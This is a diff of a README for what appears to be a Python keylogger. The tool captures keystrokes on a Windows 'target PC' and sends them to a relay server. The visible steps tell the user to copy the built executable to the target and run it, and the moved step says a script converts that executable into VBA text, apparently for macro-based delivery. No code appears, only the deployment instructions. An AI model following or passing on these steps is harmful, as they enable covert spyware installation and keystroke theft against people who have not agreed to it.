@@ -69,6 +69,8 @@ A simple Python keylogger that captures keystrokes on a Windows target PC and se
 
 5. Transfer the executable to the Windows target PC and run it by double-clicking the file.
 
+6. The `exe_to_vba.py` file converts win64file.exe to output_vba.txt . [When Final Steps are finished, win64file.exe is created]
+
 ---
 
 ### **Step 3: Set Up the Aetriks Relay Server**
@@ -76,8 +78,6 @@ A simple Python keylogger that captures keystrokes on a Windows target PC and se
 Refer to the [Aetriks Relay Server Repository](https://github.com/frHimanshu/aetriks-relay) for detailed installation instructions.
 
 ---
-
-6. The `exe_to_vba.py` file converts win64file.exe to output_vba.txt . [When Final Steps are finished, win64file.exe is created]
 
 ## Legal and Ethical Use
 
